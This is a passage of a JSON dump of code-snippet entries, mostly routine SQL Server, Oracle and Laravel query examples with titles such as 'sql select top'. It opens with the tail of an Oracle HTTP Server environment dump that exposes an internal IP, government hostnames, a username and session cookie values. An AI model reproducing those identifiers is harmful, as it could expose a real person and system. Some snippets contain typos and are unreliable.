GATEWAY_IVERSION=2     SERVER_SOFTWARE=Oracle-HTTP-Server-11g     GATEWAY_INTERFACE=CGI/1.1     SERVER_PORT=80     SERVER_NAME=rai-dc-appdev.gov.cv     REQUEST_METHOD=POST     QUERY_STRING=     PATH_INFO=/CMA_FICHA_MANTER.inserir_trata     SCRIPT_NAME=/cmfin_09     REMOTE_HOST=     REMOTE_ADDR=10.0.28.8     SERVER_PROTOCOL=HTTP/1.1     REQUEST_PROTOCOL=HTTP     REMOTE_USER=cmfin_09     ORACLE_SSO_USER=     OSSO_IDLE_TIMEOUT_EXCEEDED=     OSSO_USER_GUID=     HTTP_CONTENT_LENGTH=402     HTTP_CONTENT_TYPE=application/x-www-form-urlencoded     HTTP_USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36     HTTP_HOST=nosiappsdev.gov.cv     HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9     HTTP_ACCEPT_ENCODING=gzip, deflate, br     HTTP_ACCEPT_LANGUAGE=pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7     HTTP_ACCEPT_CHARSET=     HTTP_COOKIE=acgroupswithpersist=nada; nosimail=9FEEF8C6ECD9855F2C41AF7EF44E7F46E74C36F0; iNavigate_=1; iNavigate__35=0; acopendivids=Q4; nosiactiv=ADERITO.GONCALVES; iNavigate__11=0; iNavigate__16=0; iNavigate__57=0; iNavigate__18=0; iNavigate__58=0; iNavigate__34=0; iNavigate__12=0; iNavigate__62=0; iNavigate__39=0; iNavigate__50=0; iNavigate__36=0; iNavigate__40=0; iNavigate__31=0; iNavigate__17=0; iNavigate__48=0; iNavigate__9=0; iNavigate__10=0; iNavigate__21=0; iNavigate__13=0; iNavigate__15=0; iNavigate__6=0; iNavigate__8=0; iNavigate__5=0; iNavigate__1=0; iNavigate__2=0; iNavigate__4=0; iNavigate__51=0; iNavigate__7=0; iNavigate__59=1; iNavigate__3=1; nosisso=BDBD7948A39B8E33E0530100007FE03E     HTTP_IF_MODIFIED_SINCE=     HTTP_REFERER=https://nosiappsdev.gov.cv/cmfin_09/CMA_FICHA_MANTER.show?sessid=20081725210350882001     HTTP_SOAPACTION=     HTTP_ORACLE_ECID=     HTTP_ORACLE_CACHE_VERSION=     HTTP_AUTHORIZATION=     WEB_AUTHENT_PREFIX=     DAD_NAME=cmfin_09     DOC_ACCESS_PATH=docs     DOCUMENT_TABLE=rh_funcionarios_upload     PATH_ALIAS=     REQUEST_CHARSET=WE8MSWIN1252     REQUEST_IANA_CHARSET=WINDOWS-1252     SCRIPT_PREFIX=     HTTP_IF_MATCH=     HTTP_CACHE_CONTROL=     SOAP_BODY=     HTTP_X_ORACLE_DEVICE_CLASS=     HTTP_X_ORACLE_DEVICE_ORIENTATION=     HTTP_X_ORACLE_DEVICE_MAXDOCSIZE=     HTTP_X_ORACLE_DEVICE=     HTTP_X_ORACLE_ORIG_ACCEPT=     HTTP_X_ORACLE_ORIG_USER_AGENT=     HTTP_X_ORACLE_USER_LOCALE=     HTTP_X_ORACLE_USER_NAME=     HTTP_X_ORACLE_USER_DISPLAYNAME=     HTTP_X_ORACLE_USER_USERKIND=     HTTP_X_ORACLE_USER_AUTHKIND=     HTTP_X_ORACLE_USER_DEVICEID=     HTTP_X_ORACLE_USER_LOCATION_ADDRESSLINE1=     HTTP_X_ORACLE_USER_LOCATION_ADDRESSLINE2=     HTTP_X_ORACLE_USER_LOCATION_ADDRESSLASTLINE=     HTTP_X_ORACLE_USER_LOCATION_BLOCK=     HTTP_X_ORACLE_USER_LOCATION_CITY=     HTTP_X_ORACLE_USER_LOCATION_COMPANYNAME=     HTTP_X_ORACLE_USER_LOCATION_COUNTY=     HTTP_X_ORACLE_USER_LOCATION_STATE=     HTTP_X_ORACLE_USER_LOCATION_POSTALCODE=     HTTP_X_ORACLE_USER_LOCATION_POSTALCODEEXT=     HTTP_X_ORACLE_USER_LOCATION_COUNTRY=     HTTP_X_ORACLE_USER_LOCATION_TYPE=     HTTP_X_ORACLE_USER_LOCATION_X=     HTTP_X_ORACLE_USER_LOCATION_Y=     HTTP_X_ORACLE_SERVICE_HOME_URL=     HTTP_X_ORACLE_SERVICE_PARENT_URL=     HTTP_X_ORACLE_HOME_URL=     HTTP_X_ORACLE_MODULE_CALLBACK_URL=     HTTP_X_ORACLE_MODULE_CALLBACK_LABEL=     HTTP_X_ORACLE_CACHE_USER=     HTTP_X_ORACLE_CACHE_SUBID=     HTTP_X_ORACLE_CACHE_AUTH=     HTTP_X_ORACLE_CACHE_DEVICE=     HTTP_X_ORACLE_CACHE_LANG=     HTTP_X_ORACLE_CACHE_ENCRYPT=     HTTP_X_ORACLE_ASSERT_USER= \n",
    "reg_date": "2021-10-12T10:00:35.000Z"
  },
  {
    "id": 4129,
    "keyword": null,
    "link": null,
    "title": " sql select into variable",
    "description": "SELECT NAME, ADDRESS, PHONE INTO v_employee_name, v_employee_address, v_employee_phone_number FROM EMPLOYEE WHERE EMPLOYYE_ID = 6;\nUSE AdventureWorks2014; GO DECLARE @MyVariable int; SET @MyVariable = 1; -- Terminate the batch by using the GO keyword. GO  -- @MyVariable has gone out of scope and no longer exists.  -- This SELECT statement generates a syntax error because it is -- no longer legal to reference @MyVariable. SELECT BusinessEntityID, NationalIDNumber, JobTitle FROM HumanResources.Employee WHERE BusinessEntityID = @MyVariable; \n",
    "reg_date": "2021-10-12T10:00:35.000Z"
  },
  {
    "id": 4130,
    "keyword": null,
    "link": null,
    "title": " sql select last id",
    "description": "#Where the the column name is \"ID\" and table name is \"tablename\" and ID naming is increasing numerical value. SELECT *  FROM tablename WHERE ID = (     SELECT MAX(ID)    \tFROM Table)\nSELECT   (SELECT * FROM tableName ORDER BY col1 LIMIT 1)        AS first,   (SELECT * FROM tableName ORDER BY col1 DESC LIMIT 1)   AS last ;\nSELECT MAX(id) FROM <tablename>\n",
    "reg_date": "2021-10-12T10:00:36.000Z"
  },
  {
    "id": 4131,
    "keyword": null,
    "link": null,
    "title": " sql select lowest value row",
    "description": "SELECT t1.* FROM employees t1 INNER JOIN (     SELECT id, min(salary) AS salary FROM employees GROUP BY id ) t2 ON t1.id = t2.id AND t1.salary = t2.salary;\n",
    "reg_date": "2021-10-12T10:00:36.000Z"
  },
  {
    "id": 4132,
    "keyword": null,
    "link": null,
    "title": " sql select max value for each group",
    "description": "select name, max(value) from out_pumptable group by name \n",
    "reg_date": "2021-10-12T10:00:36.000Z"
  },
  {
    "id": 4133,
    "keyword": null,
    "link": null,
    "title": " sql select max value from multiple rows",
    "description": "SELECT name,price FROM fake_apps WHERE price = (SELECT max(price) FROM fake_apps); \n",
    "reg_date": "2021-10-12T10:00:36.000Z"
  },
  {
    "id": 4134,
    "keyword": null,
    "link": null,
    "title": " sql select max where",
    "description": "SELECT MAX(salary), MIN(salary) FROM employees WHERE genre = 'MALE';\n",
    "reg_date": "2021-10-12T10:00:36.000Z"
  },
  {
    "id": 4135,
    "keyword": null,
    "link": null,
    "title": " sql select merge multiple values",
    "description": "DECLARE @combinedString VARCHAR(MAX) SELECT @combinedString = COALESCE(@combinedString + ', ', '') + column_name FROM table_name WHERE ID = 1234  SELECT @combinedString as StringValue\n",
    "reg_date": "2021-10-12T10:00:36.000Z"
  },
  {
    "id": 4136,
    "keyword": null,
    "link": null,
    "title": " sql select min row",
    "description": "SELECT t1.* FROM employees t1 INNER JOIN (     SELECT id, min(salary) AS salary FROM employees GROUP BY id ) t2 ON t1.id = t2.id AND t1.salary = t2.salary;\n",
    "reg_date": "2021-10-12T10:00:36.000Z"
  },
  {
    "id": 4137,
    "keyword": null,
    "link": null,
    "title": " sql select most frequent value in column",
    "description": "SELECT col, COUNT(col) AS value_occurrence FROM m_table GROUP BY col ORDER BY value_occurrence DESC LIMIT 1;  -- Oracle <= 11g SELECT * FROM (SELECT col, COUNT(col) AS value_occurrence FROM m_table GROUP BY col ORDER BY value_occurrence DESC) WHERE rownum = 1;\n",
    "reg_date": "2021-10-12T10:00:36.000Z"
  },
  {
    "id": 4138,
    "keyword": null,
    "link": null,
    "title": " sql select only first occurrence",
    "description": "SELECT FIRST(column_name) FROM table_name;\n",
    "reg_date": "2021-10-12T10:00:36.000Z"
  },
  {
    "id": 4139,
    "keyword": null,
    "link": null,
    "title": " sql select row with max date",
    "description": "SELECT t1.* FROM employees t1 INNER JOIN (     SELECT id, max(job_start) AS job_start FROM employees GROUP BY id ) t2 ON t1.id = t2.id AND t1.job_start = t2.job_start;\n",
    "reg_date": "2021-10-12T10:00:36.000Z"
  },
  {
    "id": 4140,
    "keyword": null,
    "link": null,
    "title": " sql select rows with different values in one column",
    "description": "SELECT * FROM YourTable WHERE ARIDNR IN (     SELECT ARIDNR     FROM YourTable     GROUP BY ARIDNR     HAVING COUNT(*) > 1 )\n",
    "reg_date": "2021-10-12T10:00:36.000Z"
  },
  {
    "id": 4141,
    "keyword": null,
    "link": null,
    "title": " sql select second max",
    "description": "Both options you find max as a subset and then exclude from main select sql> SELECT MAX( col ) FROM table  \tWHERE col < ( SELECT MAX( col ) FROM table); sql> SELECT MAX(col) FROM table  WHERE col NOT IN (SELECT MAX(col) FROM table);\n",
    "reg_date": "2021-10-12T10:00:37.000Z"
  },
  {
    "id": 4142,
    "keyword": null,
    "link": null,
    "title": " sql select statement",
    "description": "Used to select data from a database, which is then returned in a results set. Example 1: Selects all columns from all users. SELECT * FROM users; Example 2: Selects the first_name and surname columns from all users.xx SELECT first_name, surname FROM users;\nselect [all/distinct] <COL1>, <COL2>, <COL3> from <TABLE_NAME> [join <JOIN_CONDITION>] [where <CONDITION>] [group by <COLUMN_NAME>] [having <SEARCH_CONDITION>] [order by <SORT_SPECIFICATION>]   /* Specifically for SQL -> Oracle  LEGEND:  [...]   :   optional entries <...>   :   your specific entry */\nSELECT * FROM TABLE_NAME;\nSELECT columname FROM tablename\nSELECT * FROM INFORMATION_SCHEMA.COLUMNS -- INFORMATION_SCHEMA is an ANSI-standard (American National Standard Institute) set of read-only views which provide information about all of the tables, views, columns, and procedures in a database WHERE TABLE_NAME = N'Customers' -- \"N\" defines the subsequent string (the string after the N) as being in unicode\nProjection = Select the columns in a table that are returned by a query Selection = Selects the rows in a table that are returned by a query Join = Brings together data that is  stored in different tables by specifying the link between them\n",
    "reg_date": "2021-10-12T10:00:37.000Z"
  },
  {
    "id": 4143,
    "keyword": null,
    "link": null,
    "title": " sql select sum group by id laravel",
    "description": "Document::groupBy('users_editor_id')    ->selectRaw('sum(no_of_pages) as sum, users_editor_id')    ->pluck('sum','users_editor_id');     // originally lists(), which was deprecated in favour of pluck in 5.2    // and dropped completely in 5.3    // ->lists('sum','users_editor_id');   // returns array like this: array(   users_editor_id => sum,   ... )\n",
    "reg_date": "2021-10-12T10:00:37.000Z"
  },
  {
    "id": 4144,
    "keyword": null,
    "link": null,
    "title": " sql select sum group by id laravel join",
    "description": "$users = User::select('users*', 'analytics.*', DB::raw('SUM(analytics.revenue) As revenue'))          ->leftJoin('analytics', 'analytics.user_id', '=', 'users.id')          ->where('analytics.date', Carbon::today()->toDateString())          ->get();\n",
    "reg_date": "2021-10-12T10:00:37.000Z"
  },
  {
    "id": 4145,
    "keyword": null,
    "link": null,
    "title": " sql select syntax",
    "description": "select [all/distinct] <COL1>, <COL2>, <COL3> from <TABLE_NAME> [join <JOIN_CONDITION>] [where <CONDITION>] [group by <COLUMN_NAME>] [having <SEARCH_CONDITION>] [order by <SORT_SPECIFICATION>]   /* Specifically for SQL -> Oracle  LEGEND:  [...]   :   optional entries <...>   :   your specific entry */\nSELECT * FROM TABLE_NAME;\nSELECT columname FROM tablename\nSELECT ime, prezime FROM studenti WHERE ime = 'Dejan';\nSELECT column_name FROM table_name;\nMit SELECT k&ouml;nnen Daten aus der Datenbank abgefragt werden. Es ist die am  meissten verbreitete Art.    SELECT name   FROM country   WHERE region = (       SELECT region       FROM country       WHERE name = 'Brasilien'       ) \n",
    "reg_date": "2021-10-12T10:00:37.000Z"
  },
  {
    "id": 4146,
    "keyword": null,
    "link": null,
    "title": " sql select top",
    "description": "syntax -> SELECT column_name(s) FROM table_name WHERE ROWNUM <= number  ////example/// SELECT * FROM Persons WHERE ROWNUM <=5 \n-- SQL Server / MS Access Syntax: SELECT TOP number|percent column_name(s) FROM table_name WHERE condition; -- MySQL Syntax: SELECT column_name(s) FROM table_name WHERE condition LIMIT number; -- Oracle 12 Syntax: SELECT column_name(s) FROM table_name ORDER BY column_name(s)      FETCH FIRST number ROWS ONLY; -- Older Oracle Syntax: SELECT column_name(s) FROM table_name WHERE ROWNUM <= number;\n",
    "reg_date": "2021-10-12T10:00:37.000Z"
  },
  {
    "id": 4147,
    "keyword": null,
    "link": null,
    "title": " sql select two columns",
    "description": "SELECT columnOne, columnTwo FROM yourTable;\n",
    "reg_date": "2021-10-12T10:00:37.000Z"
  },
  {
    "id": 4148,
    "keyword": null,
    "link": null,
    "title": " sql select where id not exists in another table",
    "description": "where ID not in(select ID from T2 where HISTORY_FLG!=1)\n",
    "reg_date": "2021-10-12T10:00:37.000Z"
  },
  {
    "id": 4149,
    "keyword": null,
    "link": null,
    "title": " sql select where in list",
    "description": "select * from table where id in (id1,id2.........long list)\nSELECT * FROM TABLE WHERE ID IN (id1, id2, ..., idn)\n",
    "reg_date": "2021-10-12T10:00:37.000Z"
  },
  {
    "id": 4150,
    "keyword": null,
    "link": null,
    "title": " sql select whole row max column",
    "description": "SELECT t1.* FROM employees t1 INNER JOIN (     SELECT id, max(salary) AS salary FROM employees GROUP BY id ) t2 ON t1.id = t2.id AND t1.salary = t2.salary;\n",
    "reg_date": "2021-10-12T10:00:37.000Z"
  },
  {
    "id": 4151,
    "keyword": null,
    "link": null,
    "title": " sql selet",
    "description": "SELECT * FROM table WHERE condition GROUP BY expression HAVING condition { UNION | INTERSECT | EXCEPT } ORDER BY expression LIMIT count OFFSET start\nSELECT * FROM TABLE_NAME;\n",
    "reg_date": "2021-10-12T10:00:38.000Z"
  },
  {
    "id": 4152,
    "keyword": null,
    "link": null,
    "title": " sql server: creating temp table by selecting records from other tables",
    "description": "CREATE TABLE #haro_products (     product_name VARCHAR(MAX),     list_price DEC(10,2) );\nSELECT * INTO #<Temp_Table_Name> FROM <TableName> WHERE <Conditions> ORDER BY <Col_Names OrderSeq> OPTION <Options>\n",
    "reg_date": "2021-10-12T10:00:38.000Z"
  },
  {
    "id": 4153,
    "keyword": null,
    "link": null,
    "title": " sql server: difference between hashtable and table declared using declare keyword",
    "description": "There are quite differences like below. 1. Declarations: Table variables are declared as normal variables with type as table and columns along with their datatype. whereas hashtables are created just like the normal tables. Eg. i) Table Variable:  Declare @tmpTable as Table(id Int, Name Varchar(500), Salary Decimal) \tii) Hashtable: Create Table(id Int, Name Varchar(500), Salary Decimal);  2. Next differences are where they are stored like Table variables are in Memory and Hashtables in tempdb. 3. As Hashtables are just like normal tables you can use them in transactions whereas not the table variables. 4. You can create indexes on Hashtables but not on table variables except the primary key indexes. 5. It's best to use table variables when you have small to moderate data to handle because of their better performance, as they reside in the memory.\n",
    "reg_date": "2021-10-12T10:00:38.000Z"
  },
  {
    "id": 4154,
    "keyword": null,
    "link": null,
    "title": " sql server: how to concatenate column data using comma",
    "description": " DECLARE @SQL AS VARCHAR(8000) SELECT @SQL = ISNULL(@SQL+',','') + ColumnName FROM TableName SELECT @SQL\nDECLARE @CarList nvarchar(max); SET @CarList = N''; SELECT @CarList+=CarName+N',' FROM dbo.CARS; SELECT LEFT(@CarList,LEN(@CarList)-1);\ndeclare @aa varchar (200) set @aa = ''  select @aa =      case when @aa = ''     then CarName     else @aa + coalesce(',' + CarName, '')     end   from Cars  print @aa\n",
    "reg_date": "2021-10-12T10:00:38.000Z"
  },
  {
    "id": 4155,
    "keyword": null,
    "link": null,
    "title": " sql server: query to find out all the places where the table is used",
    "description": "SELECT DISTINCT     o.name AS Object_Name,o.type_desc     FROM sys.sql_modules        m          INNER JOIN sys.objects  o ON m.object_id=o.object_id     WHERE m.definition Like '%WhateverIAmSearchingFor%'\n",
    "reg_date": "2021-10-12T10:00:38.000Z"
  },
  {
    "id": 4156,
    "keyword": null,
    "link": null,
    "title": " sql server: select column values as comma separated string",
    "description": " DECLARE @SQL AS VARCHAR(8000) SELECT @SQL = ISNULL(@SQL+',','') + ColumnName FROM TableName SELECT @SQL\n",
    "reg_date": "2021-10-12T10:00:38.000Z"
  },
  {
    "id": 4157,
    "keyword": null,
    "link": null,
    "title": " sql server 2012 query history",
    "description": "SELECT t.[text] FROM sys.dm_exec_cached_plans AS p CROSS APPLY sys.dm_exec_sql_text(p.plan_handle) AS t WHERE t.[text] LIKE N'%something unique about your query%'; \n",
    "reg_date": "2021-10-12T10:00:38.000Z"
  },
  {
    "id": 4158,
    "keyword": null,
    "link": null,
    "title": " sql server 2016 reseed identity",
    "description": "DBCC CHECKIDENT ('[TestTable]', RESEED, 0); GO \n",
    "reg_date": "2021-10-12T10:00:38.000Z"
  },
  {
    "id": 4159,
    "keyword": null,
    "link": null,
    "title": " sql server 2016 split string",
    "description": "SELECT value FROM STRING_SPLIT('Lorem ipsum dolor sit amet.', ' '); \n                                     SELECT      first_name,      last_name,     value phone FROM      sales.contacts     CROSS APPLY STRING_SPLIT(phones, ','); \nSELECT SUBSTRING('please notify the sender at the e-mail address above',0,30 + charindex(' ',SUBSTRING('please notify the sender at the e-mail address above',31,len('please notify the sender at the e-mail address above')))  )  as part1,    SUBSTRING('please notify the sender at the e-mail address above',30+ charindex(' ',SUBSTRING('please notify the sender at the e-mail address above',31,len('please notify the sender at the e-mail address above'))),len('please notify the sender at the e-mail address above')) as part2\n",
    "reg_date": "2021-10-12T10:00:38.000Z"
  },
  {
    "id": 4160,
    "keyword": null,
    "link": null,
    "title": " sql server add column",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name ADD column_name datatype;  --example ALTER TABLE Customers ADD Email varchar(255);\nALTER TABLE table_name ADD column_name varchar(50);\nALTER TABLE table_name ADD column_name datatype;\nALTER TABLE table ADD COLUMN column VARCHAR (255) NOT NULL AFTER column;\nALTER TABLE dbo.doc_exa ADD column_b VARCHAR(20) NULL, column_c INT NULL ; \n",
    "reg_date": "2021-10-12T10:00:39.000Z"
  },
  {
    "id": 4161,
    "keyword": null,
    "link": null,
    "title": " sql server add primary key to existing table with data",
    "description": "alter table Persion add primary key (persionId,Pname,PMID) \nALTER TABLE `tblauto`   ADD PRIMARY KEY (`id`);  --\nALTER TABLE Production.TransactionHistoryArchive    ADD CONSTRAINT PK_TransactionHistoryArchive_TransactionID PRIMARY KEY CLUSTERED (TransactionID); \n-- NOTE: this is for SQL-Oracle specifically  -- example: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'CUSTOMERS'  AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner;  -- syntax: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = '<table-name>' -- Replace <table-name> with your table-name AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner; \nPRIMARY KEY    -- unique identifier for the entire row of record in a table    --  can not be null and must be unique \n",
    "reg_date": "2021-10-12T10:00:39.000Z"
  },
  {
    "id": 4162,
    "keyword": null,
    "link": null,
    "title": " sql server add time to date",
    "description": "DECLARE @date DATETIME SET @date='2010-10-01' SET @date=@date+'15:00:00' SELECT @date AS DATETIME\n",
    "reg_date": "2021-10-12T10:00:39.000Z"
  },
  {
    "id": 4163,
    "keyword": null,
    "link": null,
    "title": " sql server add unique constraint",
    "description": "-- Add a Unique constraint and deifine the constraint name ALTER TABLE TableName ADD\tCONSTRAINT TableName_ColumnName_Unique UNIQUE (ColumnName)\nALTER TABLE Persons ADD UNIQUE (ID); \n",
    "reg_date": "2021-10-12T10:00:39.000Z"
  },
  {
    "id": 4164,
    "keyword": null,
    "link": null,
    "title": " sql server allow remote connections",
    "description": "1. Windows Firewall ->Advanced Settings->Inbound Rules  Add a rule to enable TCP port 1433 (default port for SQL Server)  2. Run SSMS (SQL Server Management Studio) on SQL Server machine  Server Properties -> Security -> SQL Server and Windows Authentication mode (Enable)  3. Server Properties - > Connections -> Allow Remote Connections ..&rdquo; should be checked  4. Add a SQL login (if not already there)   5. Enable SQL Service to listen on TCP/IP  Check SQL Server version and run appropriate version of SQL Configuration Manager to enable TCP.  \n",
    "reg_date": "2021-10-12T10:00:39.000Z"
  },
  {
    "id": 4165,
    "keyword": null,
    "link": null,
    "title": " sql server alter column",
    "description": "ALTER TABLE table_name ALTER COLUMN column_name datatype;  -- Example ALTER TABLE product ALTER COLUMN description VARCHAR(250);\nALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name  ALTER COLUMN column_name new_data_type(size); \nALTER TABLE dbo.doc_exa  ADD column_b VARCHAR(20) NULL,  \tcolumn_c INT NULL ;\nALTER TABLE table_name   ALTER COLUMN column_name column_type;\nALTER TABLE `Table Name` MODIFY COLUMN `Column Name` Datatype(Size);\n",
    "reg_date": "2021-10-12T10:00:39.000Z"
  },
  {
    "id": 4166,
    "keyword": null,
    "link": null,
    "title": " sql server alter table add column datetime default current timestamp",
    "description": "ALTER TABLE <tableName> ADD <columnName> Date  DEFAULT CURRENT_TIMESTAMP\n",
    "reg_date": "2021-10-12T10:00:39.000Z"
  },
  {
    "id": 4167,
    "keyword": null,
    "link": null,
    "title": " sql server alter table add column tinyint",
    "description": "ALTER TABLE ChatUser ADD COLUMN ActiveRecord TinyInt(1)\n",
    "reg_date": "2021-10-12T10:00:39.000Z"
  },
  {
    "id": 4168,
    "keyword": null,
    "link": null,
    "title": " sql server alter table column nullable",
    "description": "ALTER TABLE Customer \tALTER COLUMN CustDesc NVARCHAR(MAX) NULL; \n",
    "reg_date": "2021-10-12T10:00:39.000Z"
  },
  {
    "id": 4169,
    "keyword": null,
    "link": null,
    "title": " sql server backup database",
    "description": "DECLARE @name VARCHAR(50) -- database name   DECLARE @path VARCHAR(256) -- path for backup files   DECLARE @fileName VARCHAR(256) -- filename for backup   DECLARE @fileDate VARCHAR(20) -- used for file name   -- specify database backup directory SET @path = 'V:\\SQL_Backup\\01_Diaria\\'     -- specify filename format SELECT @fileDate = CONVERT(VARCHAR(20),GETDATE(),112)    DECLARE db_cursor CURSOR READ_ONLY FOR   SELECT name  FROM master.sys.databases  WHERE name NOT IN ('master','model','msdb','tempdb')  -- exclude these databases AND state = 0 -- database is online AND is_in_standby = 0 -- database is not read only for log shipping   OPEN db_cursor    FETCH NEXT FROM db_cursor INTO @name      WHILE @@FETCH_STATUS = 0    BEGIN       SET @fileName = @path + @name + '_' + @fileDate + '.BAK'      BACKUP DATABASE @name TO DISK = @fileName      WITH INIT, COMPRESSION      FETCH NEXT FROM db_cursor INTO @name    END       CLOSE db_cursor    DEALLOCATE db_cursor\n",
    "reg_date": "2021-10-12T10:00:39.000Z"
  },
  {
    "id": 4170,
    "keyword": null,
    "link": null,
    "title": " sql server beginning of month",
    "description": "SELECT DATEADD(month, DATEDIFF(month, 0, @mydate), 0) AS StartOfMonth\n",
    "reg_date": "2021-10-12T10:00:40.000Z"
  },
  {
    "id": 4171,
    "keyword": null,
    "link": null,
    "title": " sql server cannot create database diagram",
    "description": "EXEC dbo.sp_changedbowner @loginame = N'sa', @map = false\n",
    "reg_date": "2021-10-12T10:00:40.000Z"
  },
  {
    "id": 4172,
    "keyword": null,
    "link": null,
    "title": " sql server case sensitive search",
    "description": "SELECT 1 FROM dbo.Customers WHERE   CustID = @CustID COLLATE SQL_Latin1_General_CP1_CS_AS     AND CustPassword = @CustPassword COLLATE SQL_Latin1_General_CP1_CS_AS \n",
    "reg_date": "2021-10-12T10:00:40.000Z"
  },
  {
    "id": 4173,
    "keyword": null,
    "link": null,
    "title": " sql server case sensitive vs case insensitive",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n",
    "reg_date": "2021-10-12T10:00:40.000Z"
  },
  {
    "id": 4174,
    "keyword": null,
    "link": null,
    "title": " sql server cast date dd/mm/yyyy",
    "description": "  --string to date   SELECT cast(convert(date, '23/07/2009', 103) AS DATE)   select convert(date, '23/07/2009', 103)  \n",
    "reg_date": "2021-10-12T10:00:40.000Z"
  },
  {
    "id": 4175,
    "keyword": null,
    "link": null,
    "title": " sql server change schema of a table",
    "description": "USE AdventureWorks2012;   GO   ALTER SCHEMA HumanResources TRANSFER Person.Address;   GO   \n-- change schema from [dbo] to [exe] IF (NOT EXISTS (SELECT * FROM sys.schemas WHERE name = 'exe'))  BEGIN     EXEC ('CREATE SCHEMA [exe] AUTHORIZATION [dbo]') END  ALTER SCHEMA exe      TRANSFER dbo.Employees \n",
    "reg_date": "2021-10-12T10:00:40.000Z"
  },
  {
    "id": 4176,
    "keyword": null,
    "link": null,
    "title": " sql server check for value in multiple columns",
    "description": "SELECT * FROM table WHERE 123 IN(col1, col2, col3, col4);\n",
    "reg_date": "2021-10-12T10:00:40.000Z"
  },
  {
    "id": 4177,
    "keyword": null,
    "link": null,
    "title": " sql server check if temp table exists",
    "description": "IF OBJECT_ID('tempdb..#Results') IS NOT NULL DROP TABLE #Results GO\nIF OBJECT_ID('tempdb..#Results') IS NOT NULL DROP TABLE #Results\nIF OBJECT_ID('tempdb..#Results') IS NOT NULL     Truncate TABLE #Results else     CREATE TABLE #Results     (         Company             CHAR(3),         StepId              TINYINT,         FieldId             TINYINT,     ) \n",
    "reg_date": "2021-10-12T10:00:40.000Z"
  },
  {
    "id": 4178,
    "keyword": null,
    "link": null,
    "title": " sql server check port number",
    "description": "USE master GO xp_readerrorlog 0, 1, N'Server is listening on'  GO  #LogDate\tProcessInfo\tText #...\t\tServer\t\tServer is listening on [ ::1 <ipv6> 1434]. #2..\t\tServer\t\tServer is listening on [ 127.0.0.1 <ipv4> 1434].\nBy default SQL Server listens on TCP port number 1433, but for named instances the TCP port is dynamically configured. There are several options available to get the listening port for a SQL Server named instance.\n",
    "reg_date": "2021-10-12T10:00:40.000Z"
  },
  {
    "id": 4179,
    "keyword": null,
    "link": null,
    "title": " sql server check table exists",
    "description": "IF (EXISTS (SELECT *                   FROM INFORMATION_SCHEMA.TABLES                   WHERE TABLE_SCHEMA = 'TheSchema'                   AND  TABLE_NAME = 'TheTable')) BEGIN     --Do Stuff END\nIF EXISTS    (SELECT object_id FROM sys.tables   WHERE name = 'Artists'   AND SCHEMA_NAME(schema_id) = 'dbo')   PRINT 'The table exists' ELSE    PRINT 'The table does not exist'; \n",
    "reg_date": "2021-10-12T10:00:41.000Z"
  },
  {
    "id": 4180,
    "keyword": null,
    "link": null,
    "title": " sql server check version",
    "description": "SELECT @@VERSION AS 'SQL Server Version';  \nSELECT @@version\n",
    "reg_date": "2021-10-12T10:00:41.000Z"
  },
  {
    "id": 4181,
    "keyword": null,
    "link": null,
    "title": " sql server concat string and int",
    "description": "SELECT CONCAT(name, \"string_value\") AS name FROM    users; \nSELECT 'Comments: ' + CAST(9 AS varchar(12)) AS Result;\n",
    "reg_date": "2021-10-12T10:00:41.000Z"
  },
  {
    "id": 4182,
    "keyword": null,
    "link": null,
    "title": " sql server conditional where clause",
    "description": "select  * from transactionDetails WHERE OrderID in (400376, 400379) AND     ((TransactionDate <> ProcessingDate AND TransactionId in (2,3,9,14,15)     OR      (TransactionDate = ProcessingDate AND TransactionId in (2,3,9)))\n",
    "reg_date": "2021-10-12T10:00:41.000Z"
  },
  {
    "id": 4183,
    "keyword": null,
    "link": null,
    "title": " sql server conection string",
    "description": "Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\n",
    "reg_date": "2021-10-12T10:00:41.000Z"
  },
  {
    "id": 4184,
    "keyword": null,
    "link": null,
    "title": " sql server connection string",
    "description": "Standard Security Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;  Trusted Connection Server=myServerAddress;Database=myDataBase;Trusted_Connection=True;  Connection to a SQL Server instance The server/instance name syntax used in the server option is the same for all SQL Server connection strings. Server=myServerName\\myInstanceName;Database=myDataBase;User Id=myUsername;Password=myPassword;  Using a non-standard port If your SQL Server listens on a non-default port you can specify that using the servername,xxxx syntax (note the comma, it's not a colon). Server=myServerName,myPortNumber;Database=myDataBase;User Id=myUsername;Password=myPassword; The default SQL Server port is 1433 and there is no need to specify that in the connection string.\nServer=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\nproviderName=\"System.Data.SqlClient\"\n",
    "reg_date": "2021-10-12T10:00:41.000Z"
  },
  {
    "id": 4185,
    "keyword": null,
    "link": null,
    "title": " sql server convert date to weekday",
    "description": "SELECT DATENAME( DW , GETDATE() );\n",
    "reg_date": "2021-10-12T10:00:41.000Z"
  },
  {
    "id": 4186,
    "keyword": null,
    "link": null,
    "title": " sql server convert string to date",
